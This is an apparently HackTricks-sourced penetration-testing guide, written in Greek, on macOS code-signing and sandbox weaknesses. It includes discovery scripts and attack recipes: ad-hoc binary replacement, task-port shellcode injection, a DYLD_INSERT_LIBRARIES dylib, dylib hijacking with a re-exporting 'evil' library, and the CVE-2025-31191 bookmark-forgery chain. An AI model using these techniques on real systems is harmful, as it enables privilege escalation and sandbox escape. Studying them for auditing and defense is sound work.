# Αδυναμίες Code Signing του macOS και Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Βασικές πληροφορίες

Το **ad-hoc signing** (`CS_ADHOC`) δημιουργεί μια code signature **χωρίς certificate chain**. Εξακολουθεί να υπολογίζει hash του signed code, επομένως το validation μπορεί να εντοπίσει τροποποίηση, αλλά δεν παρέχει developer identity που να μπορεί να γίνει authenticate από άλλο component. Η αντικατάσταση και το re-signing του executable παράγει διαφορετικό CodeDirectory/CDHash.<sup>[[1]](#references)[[4]](#references)</sup>

Σε Mac με Apple Silicon, όλα τα executables απαιτούν τουλάχιστον μια ad-hoc signature. Αυτό σημαίνει ότι θα βρείτε ad-hoc signatures σε πολλά development tools, Homebrew packages και third-party utilities.

### Γιατί έχει σημασία

- **No verifiable signer identity** — οι έλεγχοι που αποδέχονται μόνο ένα path, ένα ad-hoc status ή ένα unpinned identifier δεν μπορούν να επιβεβαιώσουν ποιος παρήγαγε το binary.
- Third-party ad-hoc binaries σε **privileged positions** (FDA, daemons, helpers) είναι στόχοι υψηλής προτεραιότητας όταν το αρχείο ή ένας parent directory είναι writable.
- Ένας CDHash, designated-requirement ή requirement-backed TCC check **εντοπίζει** την αντικατάσταση. Μια path-based policy μπορεί να μην την εντοπίσει· ελέγξτε το actual requirement και επαναλάβετε το test του grant αντί να υποθέσετε ότι παραμένει μετά το re-signing.

### Discovery
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attack: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```
---

## Debuggable Processes (get-task-allow)

### Βασικές πληροφορίες

Το **entitlement `com.apple.security.get-task-allow`** (ή το flag `CS_GET_TASK_ALLOW`) επιτρέπει σε έναν εξουσιοδοτημένο debugger να αποκτήσει το task port της διεργασίας, ακόμη και όταν το Hardened Runtime κανονικά θα το απέτρεπε. Ένας επιτυχημένος debugger μπορεί να διαβάσει τη μνήμη, να τροποποιήσει registers, να κάνει inject κώδικα και να ελέγξει την εκτέλεση.<sup>[[3]](#references)</sup>

Αυτό προορίζεται **μόνο για development builds**. Ωστόσο, ορισμένα third-party binaries διατίθενται με αυτό το entitlement σε production.

> [!CAUTION]
> Ένα production binary με `get-task-allow` αποτελεί ισχυρό exploitation primitive. Τα `taskgated`, η ταυτότητα του caller, το sandboxing, τα debugger entitlements και η εξουσιοδότηση Developer Tools εξακολουθούν να επηρεάζουν το αν ένας συγκεκριμένος client μπορεί να αποκτήσει το task port. Κάντε δοκιμές τόσο με `lldb`/`debugserver` όσο και με το intended injector. Μόλις το attachment είναι επιτυχές, ο injected κώδικας εκτελείται με τα entitlements, τα TCC grants και το security context του target.

### Discovery
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Επίθεση: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## No Library Validation + DYLD Environment

### Εκκαθάριση του Runtime Library Validation

Το private entitlement **`com.apple.private.security.clear-library-validation`** δεν απενεργοποιεί το library validation κατά την εκκίνηση της διεργασίας. Αντίθετα, επιτρέπει στη διεργασία να καλέσει το `csops(..., CS_OPS_CLEAR_LV, ...)` στον εαυτό της κατά το runtime. Στη συνέχεια, το XNU εκκαθαρίζει τα `CS_REQUIRE_LV | CS_FORCED_LV`, υπό την προϋπόθεση ότι ο caller διαθέτει το entitlement και ικανοποιεί τους πρόσθετους ελέγχους του handler. Κατά συνέπεια, μια διεργασία μπορεί να γίνει κατάλληλος στόχος για library injection μόνο αφού φτάσει στη διαδρομή κώδικα που εκκαθαρίζει το library validation.<sup>[[4]](#references)[[5]](#references)</sup>

### Ο Επικίνδυνος Συνδυασμός

Όταν ένα binary διαθέτει **και τα δύο**:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (φορτώνει οποιοδήποτε dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (δέχεται DYLD env vars)

Αυτός είναι ένας συνδυασμός υψηλής αξίας για code injection, επειδή το Hardened Runtime επιτρέπει τόσο το untrusted library όσο και το DYLD environment variable. Το launch context μπορεί και πάλι να κάνει scrub τα DYLD variables (για παράδειγμα, σε protected ή privileged execution paths), επομένως επαληθεύστε την ακριβή invocation αντί να θεωρείτε το ζεύγος των entitlements unconditional.

### Discovery
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Επίθεση: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Προσωρινές Εξαιρέσεις του Sandbox

### Πώς Αποδυναμώνουν το Sandbox

Οι προσωρινές εξαιρέσεις του Sandbox (`com.apple.security.temporary-exception.*`) δημιουργούν κενά στο App Sandbox:<sup>[[2]](#references)</sup>

| Εξαίρεση | Τι επιτρέπει |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Σύνδεση σε XPC/Mach services σε επίπεδο συστήματος |
| `temporary-exception.files.absolute-path.read-write` | Ανάγνωση/εγγραφή αρχείων εκτός του app container |
| `temporary-exception.iokit-user-client-class` | Άνοιγμα συνδέσεων IOKit user-client |
| `temporary-exception.shared-preference.read-only` | Ανάγνωση των preferences άλλων apps |
| `temporary-exception.files.home-relative-path.read-write` | Πρόσβαση σε paths σχετικά με το `~` |

### Mach-Lookup Exceptions = Sandbox Escape Primitive

Η πιο επικίνδυνη εξαίρεση είναι το **mach-lookup** — επιτρέπει σε ένα sandboxed app να επικοινωνεί με privileged daemons:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Επίθεση: Sandbox Escape μέσω Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Οι Έλεγχοι Code-Signing Δεν Αποτελούν Ακεραιότητα XPC Client

Μια υπηρεσία XPC μπορεί να πραγματοποιεί authentication μιας σύνδεσης εξάγοντας την κατάσταση code-signing από το audit token και αποδεχόμενη ένα Apple **platform binary** ή έναν client που φέρει τα `CS_REQUIRE_LV`/`CS_FORCED_LV`. Αυτοί οι έλεγχοι περιγράφουν το executable και επιλεγμένα process flags· δεν αποδεικνύουν ότι το τρέχον address space περιέχει μόνο trusted code. Έρευνα σε υπηρεσίες ImageCapture έδειξε ότι ένα injectable Apple binary, όπως το `/bin/ls`, μπορούσε να φορτώσει ένα attacker dylib μέσω του `DYLD_INSERT_LIBRARIES` και στη συνέχεια να συνδεθεί ως platform client. Ένας επακόλουθος έλεγχος για library-validation flags παρακάμφθηκε επίσης, προτού η Apple αλλάξει την υπηρεσία ώστε να απαιτεί το private authorization entitlement της στο macOS 15.<sup>[[6]](#references)</sup>

### Offensive Audit Workflow

1. Κάντε reverse το `listener:shouldAcceptNewConnection:` (ή τον αντίστοιχο low-level XPC handler) και εντοπίστε αποφάσεις που βασίζονται αποκλειστικά στα `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV` ή `CS_FORCED_LV`.
2. Καταγράψτε τους Apple-signed clients που μπορούν να μιλήσουν το protocol και στη συνέχεια ελέγξτε το Hardened Runtime και τα entitlements. Ένα platform signature από μόνο του δεν αποτελεί ένδειξη ότι το DYLD injection έχει αποκλειστεί.
3. Δοκιμάστε τον υποψήφιο στο **target macOS build**. Αν φορτωθεί ένα constructor dylib, πραγματοποιήστε τη σύνδεση με την υπηρεσία από αυτόν τον constructor, ώστε το audit token να ανήκει στη συγκεκριμένη accepted platform process.
4. Επαναλάβετε τον έλεγχο κάθε vendor patch: η προσθήκη ενός ακόμη mutable process-status flag στην ίδια authorization decision ενδέχεται να μην εξαλείψει το confused-deputy primitive.
```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```
> [!NOTE]
> Η συμπεριφορά του DYLD, η πολιτική AMFI και οι έλεγχοι στην πλευρά των services αλλάζουν μεταξύ των εκδόσεων του macOS. Η αποτυχία απέναντι σε ένα πλήρως ενημερωμένο host δεν αποδεικνύει ότι η ίδια αλυσίδα απέτυχε στην ευάλωτη έκδοση.

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

Τα security-scoped bookmarks διατηρούν την επιλογή αρχείου ενός χρήστη μεταξύ εκκινήσεων. Ένα sandbox extension είναι δεσμευμένο στο boot, επομένως το `ScopedBookmarkAgent` το επικυρώνει και δημιουργεί ένα bookmark με μακροχρόνια ισχύ και authentication μέσω HMAC· όταν η εφαρμογή παρουσιάζει αργότερα αυτό το bookmark, ο agent το επικυρώνει και εκδίδει ένα νέο sandbox extension. Το signing secret αποθηκεύεται στο login keychain και ένα per-app key παράγεται με χρήση του bundle identifier.<sup>[[7]](#references)</sup>

Σε επηρεαζόμενα συστήματα, το keychain ACL εμπόδιζε μια untrusted process από το να **διαβάσει** το secret του `com.apple.scopedbookmarksagent.xpc`, αλλά δεν εμπόδιζε τη διαγραφή του. Μια compromised sandboxed app μπορούσε να αντικαταστήσει το item με ένα γνωστό secret και attacker-controlled ACL, να παράγει το app-specific HMAC key, να πλαστογραφήσει entries στο writable container bookmark plist και να ζητήσει από το `ScopedBookmarkAgent` να τα ανταλλάξει με file-access extensions. Αυτό μετέτρεπε κάθε sandboxed application που χρησιμοποιούσε security-scoped bookmarks σε πιθανό sandbox escape για arbitrary file access, χωρίς πρόσθετη αλληλεπίδραση με file picker. Η Apple διόρθωσε το issue στα security updates της 31ης Μαρτίου 2025.<sup>[[7]](#references)</sup>

### Triage and Attack Chain
```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
"$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```
Η ακολουθία εκμετάλλευσης σε έναν ευάλωτο host είναι:

1. Αποκτήστε code execution μέσα σε μια sandboxed εφαρμογή που χρησιμοποιεί persistent scoped bookmarks.
2. Αντικαταστήστε το keychain signing item του agent με ένα γνωστό secret και permissive ACL.
3. Υπολογίστε το `HMAC-SHA256(key=known_secret, data=bundle_id)` και δημιουργήστε ένα forged bookmark για ένα χρήσιμο path στο writable bookmark store της εφαρμογής.
4. Ενεργοποιήστε το normal bookmark-resolution path της εφαρμογής, ώστε το `ScopedBookmarkAgent` να επιστρέψει ένα sandbox extension.
5. Χρησιμοποιήστε τη νέα πρόσβαση σε αρχεία για να αντικαταστήσετε έναν out-of-sandbox execution ή data target που είναι διαθέσιμος σε αυτόν τον user.

Αυτή είναι μια **patched-version technique**: χρησιμοποιήστε την για να κατανοήσετε το trust boundary και να αξιολογήσετε unpatched συστήματα, όχι ως υπόθεση για τις τρέχουσες releases. Για τρέχον testing, εστιάστε στο bookmark parsing, στο identity binding, στο keychain-item lifecycle και στη συμπεριφορά confused-deputy γύρω από τον agent.

---

## Private Apple Entitlements

### Τι είναι

Τα entitlements με πρόθεμα `com.apple.private.*` παρέχουν πρόσβαση σε **Apple-internal APIs** που δεν είναι τεκμηριωμένα ή διαθέσιμα σε third-party developers. Third-party binaries με private entitlements τα απέκτησαν μέσω enterprise cert, MDM ή non-App-Store distribution.

### Επικίνδυνα Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | Πλήρες TCC database read/write |
| `com.apple.private.tcc.allow` | Πρόσβαση σε συγκεκριμένα TCC services |
| `com.apple.private.security.no-sandbox` | Εκτέλεση χωρίς sandbox |
| `com.apple.private.iokit` | Άμεση πρόσβαση σε IOKit drivers |
| `com.apple.private.kernel.\*` | Πρόσβαση σε kernel interfaces |
| `com.apple.private.xpc.launchd.job-label` | Εγγραφή/διαχείριση launchd jobs |
| `com.apple.rootless.install` | Εγγραφή σε SIP-protected paths |

### Ανακάλυψη
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Προσαρμοσμένα Sandbox Profiles (SBPL)

### Τι είναι

Τα δυαδικά αρχεία μπορούν να διαθέτουν **προσαρμοσμένα sandbox profiles** γραμμένα σε SBPL (Seatbelt Profile Language). Αυτά τα profiles μπορεί να είναι πιο περιοριστικά Ή **πιο permissive** από το προεπιλεγμένο App Sandbox.

### Auditing Custom Profiles
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Εγγράψιμες Διαδρομές Βιβλιοθηκών

### Τι Είναι

Όταν ένα binary φορτώνει μια dynamic library από ένα path στο οποίο ο τρέχων χρήστης μπορεί να **γράψει**, η βιβλιοθήκη μπορεί να αντικατασταθεί με malicious code.

### Discovery
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Attack: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Οδηγός Code Signing](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (λειτουργίες `CS_OPS_*` και `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (handler των `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [Μια νέα εποχή για τα macOS Sandbox Escapes: Διερεύνηση μιας παραγνωρισμένης επιφάνειας επίθεσης και ανακάλυψη 10+ νέων ευπαθειών](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [Ανάλυση του CVE-2025-31191: Ένα macOS Sandbox Escape βασισμένο σε security-scoped bookmarks](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
